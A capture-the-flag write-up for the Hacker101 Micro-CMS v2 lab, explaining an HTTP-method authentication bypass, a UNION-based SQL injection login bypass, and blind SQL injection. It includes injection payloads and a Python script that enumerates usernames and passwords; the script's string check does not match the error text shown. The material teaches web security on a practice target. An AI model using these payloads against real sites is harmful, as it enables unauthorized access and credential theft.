---
title: Hacker101 CTF — Micro-CMS v2
date: 2026-09-10
platform: Hacker101 . CTF
difficulty: medium
tags: [web, sqli, ctf]
excerpt: A Hacker101 CTF walkthrough covering HTTP method manipulation, SQL injection authentication bypass, and blind SQL injection to enumerate credentials.
---

### Flag 1 — HTTP Method Manipulation

While browsing the application as an unauthenticated user, I noticed that some pages contained an Edit link. Clicking the link redirected to the `/login` page, indicating that authentication was required through the normal interface.
I intercepted the request using Burp Suite and inspected the edit endpoint:
`/page/edit/1`

Instead of requesting the page normally, I changed the HTTP method to OPTIONS.
The server responded with an Allow header indicating that POST was an accepted method:
```http
HTTP/2 200 OK
Date: Thu, 10 Sep 2026 11:16:47 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 0
Server: openresty/1.31.1.1
Allow: POST, OPTIONS, GET, HEAD
```

Since POST was allowed on the endpoint, I sent a POST request directly to:
`/page/edit/1`

without authenticating through the normal login flow.
The endpoint processed the request and returned the first flag.

### Flag 2 — SQL Injection Authentication Bypass

Next, I investigated the `/login` endpoint.

Submitting a normal, nonexistent username resulted in:
`Unknown User`
I then tested whether the username parameter was vulnerable to SQL injection. Supplying:
`admin'`
caused the application to return:
`500 Server Error`
This suggested that the input was being inserted directly into an SQL query without proper sanitization or parameterization.
I then tried:
`admin' OR '1'='1'#`
Instead of receiving Unknown User, the application responded with:
`Invalid Password`
This was significant because it indicated that the SQL query was being affected by my input.

#### Understanding the login query

A simplified version of the query could be:
```mysql
SELECT * FROM users
WHERE username = 'input'
AND password = 'input';
```
If the application directly inserts user input into this query, SQL syntax can be manipulated through the username field.
I then used a `UNION` injection:
```mysql
username=admin' UNION SELECT "1234"#
password=1234
```
Conceptually, this changes the query into something similar to:
```mysql
SELECT * FROM users
WHERE username = 'admin'
UNION
SELECT "1234" #'
AND password = '1234';
```
The exact query depends on how the application constructs the SQL statement, but the important part is the `UNION SELECT`.

#### Why does SELECT `1234` work?

It is important to understand that:
`SELECT 1234;`
does not mean:
`Find 1234 in a table.`
Instead, it asks the database to produce a result containing the value `1234`.
For example, imagine the database contains:
```
USERS TABLE
┌──────────┬──────────┐
│ username │ password │
├──────────┼──────────┤
│ alice    │ apple123 │
│ bob      │ hello456 │
└──────────┴──────────┘
```
There is no `1234` in the table.

However:
`SELECT 1234;`
can still return:
```
┌──────┐
│ 1234 │
├──────┤
│ 1234 │
└──────┘
```
The database simply creates a result containing that value. It does not modify the users table.
You can think of it roughly as asking the database:
`Give me the value 1234.`

*What does `UNION` do?*
`UNION` combines the results of two SELECT statements.

*Conceptually:*
```
                 UNION
                  │
        ┌─────────┴─────────┐
        ▼                   ▼
 SELECT ...             SELECT 1234
 WHERE username=admin
        │                   │
        ▼                   ▼
     NOTHING              1234
        │                   │
        └─────────┬─────────┘
                  ▼
             FINAL RESULT
                  │
                  ▼
                1234
```
Therefore, even if the first `SELECT` does not return a matching user, the injected `SELECT 1234` can provide a result.

*Why does the password match?*
The request contains:
```
username=admin' UNION SELECT 1234#
password=1234
```
The application appears to take the value returned by the database and compare it against the password supplied by the user.

*Conceptually:*
```
             TWO DIFFERENT VALUES

        SQL                         HTTP
        │                            │
        ▼                            ▼
  SELECT 1234                  password=1234
        │                            │
        ▼                            ▼
 database returns              application receives
       1234                          1234
        │                            │
        └──────────┬─────────────────┘
                   ▼
              application
                compares
                 1234
                  =
                 1234
                   ✓
                Logged In
```
Because both values are `1234`, the application's password comparison succeeds, resulting in an authentication bypass.

### Flag 3 — Blind SQL Injection
After obtaining the previous flag,we need to determine the actual username rather than simply bypassing authentication.
I noticed that the application produced different responses depending on whether the injected SQL condition matched a user.

For example, I tested:
`admin' OR username LIKE "a%"`
The application responded with:
`Unknown User`
I then tried:
`admin' OR username LIKE "d%"`
and received:
`Invalid Password`
This gives us a useful true/false SQL.

We can interpret the responses as:
```
Unknown User
    ↓
condition is false

Invalid Password
    ↓
condition is true
```
Therefore, we can ask the database questions without directly seeing the database contents.

#### Finding the username

The SQL condition:
`username LIKE 'd%'`
means:
Does a username exist that starts with d?
The % wildcard means that any characters can follow d.
Once d is confirmed, we can try:
```
da%
db%
dc%
dd%
```

Eventually, one of these will produce the response associated with a valid match.
We can continue doing this one character at a time.

This allows us to reconstruct the username without directly retrieving it.

#### Automating the enumeration
Doing this manually would be tedious, so I automated the process with Python:
```
import requests

url = "Login_URL"

alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

username = ""

for position in range(10):

    for letter in alphabet:

        guess = username + letter

        payload = "' OR username LIKE '{}%".format(guess)

        response = requests.post(
            url,
            data={
                "username": payload,
                "password": "anything"
            }
        )

        if "Invalid password" in response.text:
            username = guess
            print("Found:", username)
            break

print("Username:", username)
```

How the script works
The script uses two nested loops, The outer loop determines how many characters we want to discover:
`for position in range(10):`
The inner loop tries every character in our alphabet:
`for letter in alphabet:`
The current guess is constructed with:
`guess = username + letter`

This eventually reveals the complete username.

#### Enumerating the password

The same technique can be applied to other values in the database, For example, after identifying the username, the SQL condition can be changed from:
`username LIKE 'prefix%'`
to:
`password LIKE 'prefix%'`
The Python logic remains almost identical:
```
Try a character
     ↓
Send the SQL condition
     ↓
Observe True/False response
     ↓
Keep the character if correct
     ↓
Repeat
```
This is the essence of blind SQL injection: even though the database does not directly return the requested value, differences in the application's responses allow us to infer it one character at a time.
